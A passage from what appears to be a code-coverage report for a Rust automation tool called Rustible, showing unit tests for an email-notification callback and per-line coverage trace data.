11);\n    }\n\n    #[test]\n    fn test_host_stats_has_issues() {\n        let ok_stats = HostStats {\n            ok: 5,\n            changed: 3,\n            failed: 0,\n            skipped: 0,\n            unreachable: 0,\n        };\n        assert!(!ok_stats.has_issues());\n\n        let failed_stats = HostStats {\n            ok: 5,\n            failed: 1,\n            ..Default::default()\n        };\n        assert!(failed_stats.has_issues());\n\n        let unreachable_stats = HostStats {\n            ok: 5,\n            unreachable: 1,\n            ..Default::default()\n        };\n        assert!(unreachable_stats.has_issues());\n    }\n\n    #[tokio::test]\n    async fn test_mail_callback_tracks_stats() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"test@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .build_unchecked();\n\n        let callback = MailCallback::new(config);\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result = create_execution_result(\"host2\", \"task1\", false, false, false, \"error\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let state = callback.state.read().await;\n\n        let host1_stats = state.host_stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 0);\n\n        let host2_stats = state.host_stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.failed, 1);\n        assert_eq!(host2_stats.skipped, 1);\n\n        assert!(state.has_failures);\n        assert_eq!(state.failed_tasks.len(), 1);\n    }\n\n    #[test]\n    fn test_generate_subject() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"test@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .subject_prefix(\"[Test]\")\n            .build_unchecked();\n\n        let callback = MailCallback::new(config);\n\n        let subject_success = callback.generate_subject(\"my-playbook\", true);\n        assert!(subject_success.contains(\"[Test]\"));\n        assert!(subject_success.contains(\"my-playbook\"));\n        assert!(subject_success.contains(\"successfully\"));\n\n        let subject_failure = callback.generate_subject(\"my-playbook\", false);\n        assert!(subject_failure.contains(\"FAILED\"));\n    }\n\n    #[tokio::test]\n    async fn test_generate_body() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"test@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .build_unchecked();\n\n        let callback = MailCallback::new(config);\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let result = create_execution_result(\"host1\", \"task1\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026result).await;\n\n        let state = callback.state.read().await;\n        let body = callback.generate_body(\u0026state, true);\n\n        assert!(body.contains(\"Playbook Execution Summary\"));\n        assert!(body.contains(\"test-playbook\"));\n        assert!(body.contains(\"SUCCESS\"));\n        assert!(body.contains(\"host1\"));\n        assert!(body.contains(\"Changed: 1\"));\n        assert!(body.contains(\"Generated by Rustible\"));\n    }\n\n    #[tokio::test]\n    async fn test_unreachable_callback() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"test@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .build_unchecked();\n\n        let callback = MailCallback::new(config);\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback\n            .on_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        let state = callback.state.read().await;\n        let host_stats = state.host_stats.get(\"host1\").unwrap();\n        assert_eq!(host_stats.unreachable, 1);\n        assert!(state.has_failures);\n        assert_eq!(state.failed_tasks.len(), 1);\n        assert!(state.failed_tasks[0].message.contains(\"unreachable\"));\n    }\n\n    #[test]\n    fn test_build_email_message() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"sender@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .add_recipient(\"ops@example.com\")\n            .build_unchecked();\n\n        let message = build_email_message(\u0026config, \"Test Subject\", \"Test body\\nLine 2\");\n\n        assert!(message.contains(\"From: sender@example.com\"));\n        assert!(message.contains(\"To: admin@example.com, ops@example.com\"));\n        assert!(message.contains(\"Subject: Test Subject\"));\n        assert!(message.contains(\"MIME-Version: 1.0\"));\n        assert!(message.contains(\"Content-Type: text/plain\"));\n        assert!(message.contains(\"X-Mailer: Rustible\"));\n        assert!(message.contains(\"Test body\"));\n        assert!(message.contains(\"Line 2\"));\n        assert!(message.ends_with(\"\\r\\n.\\r\\n\"));\n    }\n\n    #[test]\n    fn test_build_email_message_escapes_dots() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"sender@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .build_unchecked();\n\n        let message = build_email_message(\u0026config, \"Test\", \"Line 1\\n.\\nLine 3\");\n        assert!(message.contains(\"..\\n\")); // Escaped dot\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"test@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .build_unchecked();\n\n        let callback1 = MailCallback::new(config);\n        let callback2 = callback1.clone();\n\n        assert!(Arc::ptr_eq(\u0026callback1.state, \u0026callback2.state));\n    }\n\n    #[test]\n    fn test_on_failure_only() {\n        let config = MailConfig::builder()\n            .smtp_host(\"smtp.example.com\")\n            .from_address(\"test@example.com\")\n            .add_recipient(\"admin@example.com\")\n            .on_failure_only(true)\n            .build_unchecked();\n\n        let callback = MailCallback::new(config);\n        assert!(callback.on_failure_only());\n    }\n\n    // Helper function for tests\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        use crate::traits::ModuleResult;\n\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n}\n","traces":[{"line":117,"address":[30415183,30414640,30415177],"length":1,"stats":{"Line":1}},{"line":118,"address":[30414746,30414660],"length":1,"stats":{"Line":2}},{"line":119,"address":[30414762],"length":1,"stats":{"Line":1}},{"line":120,"address":[30414901],"length":1,"stats":{"Line":1}},{"line":121,"address":[30415040],"length":1,"stats":{"Line":1}},{"line":128,"address":[30384416],"length":1,"stats":{"Line":1}},{"line":129,"address":[30384443],"length":1,"stats":{"Line":1}},{"line":130,"address":[30384475],"length":1,"stats":{"Line":1}},{"line":131,"address":[30384515],"length":1,"stats":{"Line":1}},{"line":132,"address":[30384555],"length":1,"stats":{"Line":1}},{"line":163,"address":[30387625,30387663,30387168],"length":1,"stats":{"Line":1}},{"line":165,"address":[30387190],"length":1,"stats":{"Line":1}},{"line":169,"address":[30387220],"length":1,"stats":{"Line":1}},{"line":170,"address":[30387268],"length":1,"stats":{"Line":1}},{"line":173,"address":[30387322],"length":1,"stats":{"Line":1}},{"line":181,"address":[30387776],"length":1,"stats":{"Line":1}},{"line":182,"address":[30387784],"length":1,"stats":{"Line":1}},{"line":202,"address":[30387808,30389987,30390253],"length":1,"stats":{"Line":0}},{"line":203,"address":[28602384,28602519],"length":1,"stats":{"Line":0}},{"line":204,"address":[28602402,28602470],"length":1,"stats":{"Line":0}},{"line":207,"address":[28603072,28603207],"length":1,"stats":{"Line":0}},{"line":208,"address":[28603090,28603158],"length":1,"stats":{"Line":0}},{"line":211,"address":[30388409,30388481],"length":1,"stats":{"Line":0}},{"line":212,"address":[30388516],"length":1,"stats":{"Line":0}},{"line":214,"address":[28602016,28602069],"length":1,"stats":{"Line":0}},{"line":215,"address":[28602569,28602544],"length":1,"stats":{"Line":0}},{"line":218,"address":[30388748,30388677],"length":1,"stats":{"Line":0}},{"line":219,"address":[30389998],"length":1,"stats":{"Line":0}},{"line":220,"address":[30388785],"length":1,"stats":{"Line":0}},{"line":224,"address":[30388754,30388913],"length":1,"stats":{"Line":0}},{"line":226,"address":[30388854],"length":1,"stats":{"Line":0}},{"line":229,"address":[30389003,30388921],"length":1,"stats":{"Line":0}},{"line":230,"address":[28602784,28602793],"length":1,"stats":{"Line":0}},{"line":231,"address":[30388988],"length":1,"stats":{"Line":0}},{"line":233,"address":[30389010,30389089],"length":1,"stats":{"Line":0}},{"line":234,"address":[28602121,28602112],"length":1,"stats":{"Line":0}},{"line":237,"address":[28603232,28603248],"length":1,"stats":{"Line":0}},{"line":240,"address":[30389159,30389322],"length":1,"stats":{"Line":0}},{"line":242,"address":[30389269],"length":1,"stats":{"Line":0}},{"line":245,"address":[30389692],"length":1,"stats":{"Line":0}},{"line":246,"address":[30389330],"length":1,"stats":{"Line":0}},{"line":248,"address":[30389364,30389439],"length":1,"stats":{"Line":0}},{"line":249,"address":[30389538,30389466],"length":1,"stats":{"Line":0}},{"line":250,"address":[30389588],"length":1,"stats":{"Line":0}},{"line":251,"address":[30389628],"length":1,"stats":{"Line":0}},{"line":254,"address":[30389660],"length":1,"stats":{"Line":0}},{"line":264,"address":[30390288],"length":1,"stats":{"Line":1}},{"line":265,"address":[30390326],"length":1,"stats":{"Line":1}},{"line":266,"address":[30390355],"length":1,"stats":{"Line":1}},{"line":268,"address":[30390340],"length":1,"stats":{"Line":1}},{"line":269,"address":[30390478],"length":1,"stats":{"Line":1}},{"line":271,"address":[30390458],"length":1,"stats":{"Line":1}},{"line":272,"address":[30390663],"length":1,"stats":{"Line":1}},{"line":273,"address":[30390632],"length":1,"stats":{"Line":1}},{"line":277,"address":[30390596],"length":1,"stats":{"Line":1}},{"line":278,"address":[30390750],"length":1,"stats":{"Line":1}},{"line":283,"address":[30390969,30391010],"length":1,"stats":{"Line":2}},{"line":284,"address":[30391079],"length":1,"stats":{"Line":1}},{"line":285,"address":[30391131],"length":1,"stats":{"Line":1}},{"line":291,"address":[30391120],"length":1,"stats":{"Line":1}},{"line":303,"address":[30412208],"length":1,"stats":{"Line":1}},{"line":304,"address":[30412216],"length":1,"stats":{"Line":1}},{"line":308,"address":[28608608,28608838],"length":1,"stats":{"Line":1}},{"line":309,"address":[28608722,28608663],"length":1,"stats":{"Line":2}},{"line":310,"address":[28608818],"length":1,"stats":{"Line":1}},{"line":314,"address":[30412624],"length":1,"stats":{"Line":1}},{"line":315,"address":[30412644],"length":1,"stats":{"Line":1}},{"line":316,"address":[30412651],"length":1,"stats":{"Line":1}},{"line":320,"address":[28608864,28609132],"length":1,"stats":{"Line":1}},{"line":321,"address":[28608984,28608922],"length":1,"stats":{"Line":2}},{"line":322,"address":[28609109],"length":1,"stats":{"Line":1}},{"line":326,"address":[28608048,28608328],"length":1,"stats":{"Line":1}},{"line":327,"address":[28608168,28608106],"length":1,"stats":{"Line":2}},{"line":328,"address":[28608305],"length":1,"stats":{"Line":1}},{"line":332,"address":[28607836,28607600],"length":1,"stats":{"Line":1}},{"line":333,"address":[28607655,28607714],"length":1,"stats":{"Line":2}},{"line":334,"address":[28607816],"length":1,"stats":{"Line":1}},{"line":338,"address":[28608020,28607856],"length":1,"stats":{"Line":1}},{"line":339,"address":[28607909,28607974],"length":1,"stats":{"Line":2}},{"line":340,"address":[28608000],"length":1,"stats":{"Line":1}},{"line":344,"address":[30411888,30412041],"length":1,"stats":{"Line":0}},{"line":345,"address":[30411998,30411920],"length":1,"stats":{"Line":0}},{"line":346,"address":[30412021],"length":1,"stats":{"Line":0}},{"line":350,"address":[30412576],"length":1,"stats":{"Line":1}},{"line":351,"address":[30412594],"length":1,"stats":{"Line":1}},{"line":352,"address":[30412600],"length":1,"stats":{"Line":1}},{"line":356,"address":[30412144],"length":1,"stats":{"Line":1}},{"line":357,"address":[30412167],"length":1,"stats":{"Line":1}},{"line":358,"address":[30412175],"length":1,"stats":{"Line":1}},{"line":362,"address":[28608352,28608588],"length":1,"stats":{"Line":1}},{"line":363,"address":[28608407,28608466],"length":1,"stats":{"Line":2}},{"line":364,"address":[28608568],"length":1,"stats":{"Line":1}},{"line":368,"address":[30412064],"length":1,"stats":{"Line":1}},{"line":369,"address":[30412081],"length":1,"stats":{"Line":1}},{"line":370,"address":[30412088],"length":1,"stats":{"Line":1}},{"line":378,"address":[30412550,30412240],"length":1,"stats":{"Line":1}},{"line":379,"address":[30412327,30412270],"length":1,"stats":{"Line":2}},{"line":380,"address":[30412484],"length":1,"stats":{"Line":1}},{"line":386,"address":[30412112],"length":1,"stats":{"Line":1}},{"line":387,"address":[30412120],"length":1,"stats":{"Line":1}},{"line":408,"address":[30415248],"length":1,"stats":{"Line":1}},{"line":409,"address":[30415360,30415262],"length":1,"stats":{"Line":1}},{"line":414,"address":[30415200],"length":1,"stats":{"Line":1}},{"line":415,"address":[30415210],"length":1,"stats":{"Line":1}},{"line":444,"address":[30397888,30397962],"length":1,"stats":{"Line":1}},{"line":445,"address":[30397911,30397935,30397992],"length":1,"stats":{"Line":2}},{"line":446,"address":[30398019],"length":1,"stats":{"Line":1}},{"line":447,"address":[30398030],"length":1,"stats":{"Line":1}},{"line":448,"address":[30398043],"length":1,"stats":{"Line":1}},{"line":449,"address":[30398047],"length":1,"stats":{"Line":1}},{"line":509,"address":[30397191,30397008],"length":1,"stats":{"Line":1}},{"line":512,"address":[30397052,30397093],"length":1,"stats":{"Line":2}},{"line":532,"address":[30397869,30397232,30397844],"length":1,"stats":{"Line":0}},{"line":533,"address":[30397249],"length":1,"stats":{"Line":0}},{"line":534,"address":[30397545,30397481],"length":1,"stats":{"Line":0}},{"line":535,"address":[30397722],"length":1,"stats":{"Line":0}},{"line":540,"address":[30397216],"length":1,"stats":{"Line":0}},{"line":546,"address":[30396608],"length":1,"stats":{"Line":1}},{"line":547,"address":[30396613],"length":1,"stats":{"Line":1}},{"line":551,"address":[30396624],"length":1,"stats":{"Line":1}},{"line":552,"address":[30396678,30396703],"length":1,"stats":{"Line":2}},{"line":553,"address":[30396705],"length":1,"stats":{"Line":1}},{"line":555,"address":[30396682],"length":1,"stats":{"Line":1}},{"line":557,"address":[30396730],"length":1,"stats":{"Line":1}},{"line":564,"address":[30391424,30392720,30396567],"length":1,"stats":{"Line":1}},{"line":565,"address":[30391489],"length":1,"stats":{"Line":1}},{"line":567,"address":[30391531,30391619],"length":1,"stats":{"Line":2}},{"line":570,"address":[30391690],"length":1,"stats":{"Line":1}},{"line":571,"address":[30391781],"length":1,"stats":{"Line":1}},{"line":572,"address":[30391872],"length":1,"stats":{"Line":1}},{"line":575,"address":[30391971],"length":1,"stats":{"Line":1}},{"line":576,"address":[30392190],"length":1,"stats":{"Line":1}},{"line":579,"address":[30392120],"length":1,"stats":{"Line":1}},{"line":584,"address":[30392340],"length":1,"stats":{"Line":1}},{"line":585,"address":[30392396,30392474],"length":1,"stats":{"Line":2}},{"line":586,"address":[30392497],"length":1,"stats":{"Line":1}},{"line":589,"address":[30392430,30392726],"length":1,"stats":{"Line":2}},{"line":592,"address":[30392799],"length":1,"stats":{"Line":1}},{"line":593,"address":[30392826,30392881],"length":1,"stats":{"Line":0}},{"line":594,"address":[30392946],"length":1,"stats":{"Line":0}},{"line":595,"address":[30393037],"length":1,"stats":{"Line":0}},{"line":597,"address":[30393136],"length":1,"stats":{"Line":0}},{"line":598,"address":[30393274],"length":1,"stats":{"Line":0}},{"line":599,"address":[30393415],"length":1,"stats":{"Line":0}},{"line":600,"address":[30393560],"length":1,"stats":{"Line":0}},{"line":601,"address":[30393700],"length":1,"stats":{"Line":0}},{"line":606,"address":[30392852,30393790],"length":1,"stats":{"Line":2}},{"line":607,"address":[30393849],"length":1,"stats":{"Line":1}},{"line":608,"address":[30393934],"length":1,"stats":{"Line":1}},{"line":610,"address":[30394027],"length":1,"stats":{"Line":1}},{"line":611,"address":[30394144,30394077],"length":1,"stats":{"Line":2}},{"line":613,"address":[30394151],"length":1,"stats":{"Line":1}},{"line":614,"address":[30394162],"length":1,"stats":{"Line":1}},{"line":615,"address":[30394173],"length":1,"stats":{"Line":1}},{"line":616,"address":[30394184],"length":1,"stats":{"Line":1}},{"line":617,"address":[30394195],"length":1,"stats":{"Line":1}},{"line":619,"address":[30394214],"length":1,"stats":{"Line":1}},{"line":620,"address":[30394345,30396541,30395603],"length":1,"stats":{"Line":3}},{"line":621,"address":[30395675],"length":1,"stats":{"Line":1}},{"line":622,"address":[30395812],"length":1,"stats":{"Line":1}},{"line":628,"address":[30396184],"length":1,"stats":{"Line":1}},{"line":630,"address":[30396274,30396335],"length":1,"stats":{"Line":1}},{"line":631,"address":[30396311,30396364,30396395],"length":1,"stats":{"Line":2}},{"line":632,"address":[30396371,30396453,30396422],"length":1,"stats":{"Line":2}},{"line":633,"address":[30396429,30396510,30396480],"length":1,"stats":{"Line":2}},{"line":634,"address":[30396534,30396487,30396546],"length":1,"stats":{"Line":2}},{"line":639,"address":[30394375],"length":1,"stats":{"Line":1}},{"line":640,"address":[30394460],"length":1,"stats":{"Line":1}},{"line":641,"address":[30394553],"length":1,"stats":{"Line":1}},{"line":642,"address":[30394697],"length":1,"stats":{"Line":1}},{"line":643,"address":[30394841],"length":1,"stats":{"Line":1}},{"line":644,"address":[30394985],"length":1,"stats":{"Line":1}},{"line":645,"address":[30395129],"length":1,"stats":{"Line":1}},{"line":646,"address":[30395265],"length":1,"stats":{"Line":1}},{"line":649,"address":[30395350],"length":1,"stats":{"Line":1}},{"line":650,"address":[30395435],"length":1,"stats":{"Line":1}},{"line":652,"address":[30395528],"length":1,"stats":{"Line":1}},{"line":656,"address":[30391360,30391388],"length":1,"stats":{"Line":0}},{"line":657,"address":[28603500],"length":1,"stats":{"Line":0}},{"line":658,"address":[28603598],"length":1,"stats":{"Line":0}},{"line":659,"address":[28603661],"length":1,"stats":{"Line":0}},{"line":661,"address":[28604795,28604216,28604484,28604768,28604353,28604054,28603751,28603868],"length":1,"stats":{"Line":0}},{"line":662,"address":[25975604],"length":1,"stats":{"Line":0}},{"line":663,"address":[28604741,28604677,28604496,28604193],"length":1,"stats":{"Line":0}},{"line":664,"address":[28604518,28604582],"length":1,"stats":{"Line":0}},{"line":671,"address":[30387031,30386880,30387025],"length":1,"stats":{"Line":1}},{"line":673,"address":[30386914],"length":1,"stats":{"Line":1}},{"line":674,"address":[30386924],"length":1,"stats":{"Line":1}},{"line":681,"address":[28597801,28597915,28598045,28597876,28597776,28598787,28598732],"length":1,"stats":{"Line":4}},{"line":682,"address":[28597903,28597967,28597857,28598076],"length":1,"stats":{"Line":2}},{"line":683,"address":[28598332,28598278],"length":1,"stats":{"Line":2}},{"line":684,"address":[28598371,28598460,28598755,28598344,28598526],"length":1,"stats":{"Line":1}},{"line":685,"address":[28598639],"length":1,"stats":{"Line":1}},{"line":688,"address":[28592496,28592527,28592621,28593786,28592823,28593831,28592664,28596162,28594374],"length":1,"stats":{"Line":0}},{"line":689,"address":[28592651,28592857,28592736,28592595],"length":1,"stats":{"Line":0}},{"line":692,"address":[28593106,28593163],"length":1,"stats":{"Line":0}},{"line":693,"address":[28593169,28593888,28594171],"length":1,"stats":{"Line":0}},{"line":700,"address":[28593127],"length":1,"stats":{"Line":0}},{"line":701,"address":[28593249,28593345],"length":1,"stats":{"Line":0}},{"line":704,"address":[28593368],"length":1,"stats":{"Line":0}},{"line":707,"address":[26115022],"length":1,"stats":{"Line":0}},{"line":708,"address":[28594882,28594979,28595220],"length":1,"stats":{"Line":0}},{"line":710,"address":[28595806],"length":1,"stats":{"Line":0}},{"line":717,"address":[28591600,28591731,28592300,28591625,28591855,28592407,28591692],"length":1,"stats":{"Line":4}},{"line":718,"address":[26112308],"length":1,"stats":{"Line":2}},{"line":719,"address":[28592085,28592161],"length":1,"stats":{"Line":2}},{"line":720,"address":[28592333,28592271],"length":1,"stats":{"Line":2}},{"line":724,"address":[30383195],"length":1,"stats":{"Line":0}},{"line":728,"address":[28592435,28592416],"length":1,"stats":{"Line":0}},{"line":732,"address":[30383508],"length":1,"stats":{"Line":4}},{"line":733,"address":[28596425,28596644,28596471,28596535],"length":1,"stats":{"Line":2}},{"line":734,"address":[28596846,28596905],"length":1,"stats":{"Line":2}},{"line":736,"address":[28597633,28597003],"length":1,"stats":{"Line":2}},{"line":737,"address":[28597041,28597638,28597630],"length":1,"stats":{"Line":2}},{"line":738,"address":[28597021],"length":1,"stats":{"Line":1}},{"line":739,"address":[28597125,28597071,28597145],"length":1,"stats":{"Line":2}},{"line":740,"address":[28597133,28597170],"length":1,"stats":{"Line":2}},{"line":743,"address":[28597179,28597373],"length":1,"stats":{"Line":2}},{"line":744,"address":[28597196],"length":1,"stats":{"Line":1}},{"line":745,"address":[28597224],"length":1,"stats":{"Line":1}},{"line":746,"address":[28597300],"length":1,"stats":{"Line":1}},{"line":748,"address":[28597563,28597598,28597094],"length":1,"stats":{"Line":3}},{"line":749,"address":[28597595,28597600,28597534],"length":1,"stats":{"Line":2}},{"line":751,"address":[28597512,28597565,28597561],"length":1,"stats":{"Line":2}},{"line":755,"address":[30383715],"length":1,"stats":{"Line":0}},{"line":759,"address":[30383576],"length":1,"stats":{"Line":0}},{"line":773,"address":[28598975,28600063,28598905,28599014,28598880,28599141,28600037],"length":1,"stats":{"Line":4}},{"line":774,"address":[26148263],"length":1,"stats":{"Line":2}},{"line":775,"address":[28599433,28599374],"length":1,"stats":{"Line":2}},{"line":776,"address":[28599530,28599575],"length":1,"stats":{"Line":1}},{"line":777,"address":[28599600,28599563],"length":1,"stats":{"Line":2}},{"line":780,"address":[28599909,28599609],"length":1,"stats":{"Line":2}},{"line":781,"address":[28599625],"length":1,"stats":{"Line":1}},{"line":782,"address":[28599657],"length":1,"stats":{"Line":1}},{"line":783,"address":[28599733,28599805],"length":1,"stats":{"Line":2}},{"line":789,"address":[30401648],"length":1,"stats":{"Line":1}},{"line":790,"address":[30401674],"length":1,"stats":{"Line":1}},{"line":792,"address":[30401690],"length":1,"stats":{"Line":1}},{"line":793,"address":[30401736],"length":1,"stats":{"Line":1}},{"line":794,"address":[30401706],"length":1,"stats":{"Line":1}},{"line":795,"address":[30401939],"length":1,"stats":{"Line":1}},{"line":796,"address":[30401914],"length":1,"stats":{"Line":1}},{"line":797,"address":[30402535],"length":1,"stats":{"Line":1}},{"line":798,"address":[30402579],"length":1,"stats":{"Line":1}},{"line":799,"address":[30402603],"length":1,"stats":{"Line":1}},{"line":801,"address":[30402102],"length":1,"stats":{"Line":1}},{"line":802,"address":[30402146],"length":1,"stats":{"Line":1}},{"line":803,"address":[30402209],"length":1,"stats":{"Line":1}},{"line":804,"address":[30402226],"length":1,"stats":{"Line":1}},{"line":816,"address":[30402864,30408451,30411866],"length":1,"stats":{"Line":0}},{"line":820,"address":[30402997],"length":1,"stats":{"Line":0}},{"line":822,"address":[30403222,30403529,30403305,30411864],"length":1,"stats":{"Line":0}},{"line":823,"address":[28607247],"length":1,"stats":{"Line":0}},{"line":826,"address":[30403626],"length":1,"stats":{"Line":0}},{"line":828,"address":[28607073,28607142,28607148,28606832],"length":1,"stats":{"Line":0}},{"line":829,"address":[28606862,28606943],"length":1,"stats":{"Line":0}},{"line":834,"address":[30404049,30403964],"length":1,"stats":{"Line":0}},{"line":837,"address":[30404103],"length":1,"stats":{"Line":0}},{"line":840,"address":[30404193],"length":1,"stats":{"Line":0}},{"line":843,"address":[30411811,30404244,30404307],"length":1,"stats":{"Line":0}},{"line":846,"address":[30404573],"length":1,"stats":{"Line":0}},{"line":847,"address":[30404608],"length":1,"stats":{"Line":0}},{"line":848,"address":[30404615],"length":1,"stats":{"Line":0}},{"line":849,"address":[30404724,30404653,30411774],"length":1,"stats":{"Line":0}},{"line":850,"address":[30411769,30405177],"length":1,"stats":{"Line":0}},{"line":853,"address":[30405474],"length":1,"stats":{"Line":0}},{"line":854,"address":[30405595,30411764],"length":1,"stats":{"Line":0}},{"line":855,"address":[30405850],"length":1,"stats":{"Line":0}},{"line":856,"address":[30405865,30405926],"length":1,"stats":{"Line":0}},{"line":857,"address":[30405950],"length":1,"stats":{"Line":0}},{"line":865,"address":[30406439,30405523,30406529],"length":1,"stats":{"Line":0}},{"line":866,"address":[30408485,30406545],"length":1,"stats":{"Line":0}},{"line":867,"address":[30406800,30408483],"length":1,"stats":{"Line":0}},{"line":869,"address":[30407097],"length":1,"stats":{"Line":0}},{"line":870,"address":[30408459,30407127,30407214],"length":1,"stats":{"Line":0}},{"line":871,"address":[30408457,30407441],"length":1,"stats":{"Line":0}},{"line":873,"address":[30407738],"length":1,"stats":{"Line":0}},{"line":874,"address":[30408430,30407768,30407855],"length":1,"stats":{"Line":0}},{"line":875,"address":[30408082,30408409],"length":1,"stats":{"Line":0}},{"line":879,"address":[30408487,30411742,30406479],"length":1,"stats":{"Line":0}},{"line":880,"address":[30408928,30411737],"length":1,"stats":{"Line":0}},{"line":883,"address":[30409225],"length":1,"stats":{"Line":0}},{"line":884,"address":[30410982,30411715,30409368],"length":1,"stats":{"Line":0}},{"line":885,"address":[30411421],"length":1,"stats":{"Line":0}},{"line":889,"address":[30410977,30409398],"length":1,"stats":{"Line":0}},{"line":890,"address":[30409653,30410972],"length":1,"stats":{"Line":0}},{"line":893,"address":[30409990],"length":1,"stats":{"Line":0}},{"line":894,"address":[30410092,30410005,30410970],"length":1,"stats":{"Line":0}},{"line":895,"address":[30410319,30410968],"length":1,"stats":{"Line":0}},{"line":898,"address":[30410944,30410608],"length":1,"stats":{"Line":0}},{"line":901,"address":[30410847],"length":1,"stats":{"Line":0}},{"line":905,"address":[30412672,30414617,30414623],"length":1,"stats":{"Line":1}},{"line":906,"address":[30412832,30412754],"length":1,"stats":{"Line":1}},{"line":909,"address":[30412886,30412801],"length":1,"stats":{"Line":2}},{"line":910,"address":[30412997],"length":1,"stats":{"Line":1}},{"line":911,"address":[30413273],"length":1,"stats":{"Line":1}},{"line":912,"address":[30413406],"length":1,"stats":{"Line":1}},{"line":913,"address":[30413488],"length":1,"stats":{"Line":1}},{"line":914,"address":[30413570],"length":1,"stats":{"Line":1}},{"line":915,"address":[30413652],"length":1,"stats":{"Line":1}},{"line":918,"address":[30413734],"length":1,"stats":{"Line":1}},{"line":919,"address":[30413871,30413800],"length":1,"stats":{"Line":2}},{"line":922,"address":[30413753],"length":1,"stats":{"Line":1}},{"line":927,"address":[30413996],"length":1,"stats":{"Line":1}},{"line":930,"address":[30414096],"length":1,"stats":{"Line":1}},{"line":931,"address":[30414378,30414270],"length":1,"stats":{"Line":2}},{"line":932,"address":[30414419,30414556],"length":1,"stats":{"Line":2}},{"line":934,"address":[30414445,30414392],"length":1,"stats":{"Line":2}},{"line":939,"address":[30414300],"length":1,"stats":{"Line":1}},{"line":941,"address":[30414334],"length":1,"stats":{"Line":1}},{"line":951,"address":[30401259,30401265,30401136],"length":1,"stats":{"Line":0}},{"line":954,"address":[30401157],"length":1,"stats":{"Line":0}},{"line":958,"address":[30398840,30398064,30398846],"length":1,"stats":{"Line":0}},{"line":959,"address":[30398109],"length":1,"stats":{"Line":0}},{"line":960,"address":[30398529,30398374,30398244,30398838],"length":1,"stats":{"Line":0}},{"line":961,"address":[30398253,30398326],"length":1,"stats":{"Line":0}},{"line":962,"address":[28605449,28605518,28605264,28605524],"length":1,"stats":{"Line":0}},{"line":963,"address":[28605359,28605291],"length":1,"stats":{"Line":0}},{"line":966,"address":[28605230,28605236,28605161,28604976],"length":1,"stats":{"Line":0}},{"line":967,"address":[28605071,28605003],"length":1,"stats":{"Line":0}},{"line":970,"address":[30398793],"length":1,"stats":{"Line":0}},{"line":973,"address":[30401280],"length":1,"stats":{"Line":0}},{"line":974,"address":[30401465,30401352,30401395],"length":1,"stats":{"Line":0}},{"line":975,"address":[30401361],"length":1,"stats":{"Line":0}},{"line":976,"address":[28606590,28606521,28606596,28606336],"length":1,"stats":{"Line":0}},{"line":977,"address":[28606431,28606363],"length":1,"stats":{"Line":0}},{"line":980,"address":[28606233,28606048,28606302,28606308],"length":1,"stats":{"Line":0}},{"line":981,"address":[28606075,28606143],"length":1,"stats":{"Line":0}},{"line":984,"address":[30401626],"length":1,"stats":{"Line":0}},{"line":987,"address":[30401103,30398864,30401114],"length":1,"stats":{"Line":0}},{"line":988,"address":[30398914],"length":1,"stats":{"Line":0}},{"line":991,"address":[30401109,30398935,30399277,30399119],"length":1,"stats":{"Line":0}},{"line":993,"address":[30399045,30398950],"length":1,"stats":{"Line":0}},{"line":994,"address":[30399096],"length":1,"stats":{"Line":0}},{"line":995,"address":[28605787,28605855],"length":1,"stats":{"Line":0}},{"line":999,"address":[30399326],"length":1,"stats":{"Line":0}},{"line":1000,"address":[30399421],"length":1,"stats":{"Line":0}},{"line":1001,"address":[30399332],"length":1,"stats":{"Line":0}},{"line":1006,"address":[30399553,30399379],"length":1,"stats":{"Line":0}},{"line":1009,"address":[30399709],"length":1,"stats":{"Line":0}},{"line":1011,"address":[30399802],"length":1,"stats":{"Line":0}},{"line":1012,"address":[30399973],"length":1,"stats":{"Line":0}},{"line":1019,"address":[30400423,30400252,30400342,30400143,30400581],"length":1,"stats":{